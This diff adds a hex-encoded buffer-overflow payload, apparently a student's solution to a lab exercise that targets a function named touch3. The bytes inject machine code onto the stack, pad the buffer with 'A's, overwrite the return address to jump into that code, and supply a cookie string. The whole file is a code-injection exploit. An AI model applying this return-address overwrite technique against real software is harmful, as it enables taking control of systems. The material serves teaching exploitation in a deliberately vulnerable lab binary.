@@ -1,0 +1,11 @@
+68 e3 1d 40 00			/* pushq $0x401de3 # push addr of touch3 */
+48 c7 c7 b8 f8			/* movq $0x5561f8b8,%rdi # addr of cookie str */
+61 55 c3 41 41			/* ret */
+41 41 41 41 41			/* # padding bytes ('A') */
+41 41 41 41 41
+41 41 41 41 41
+41 41 41 41 41
+41 41 41 41 41
+88 f8 61 55 00 00 00 00	/* # addr of first instruction to execute */
+32 33 32 61 64			/* # cookie str plus terminating byte */
+64 31 62 00
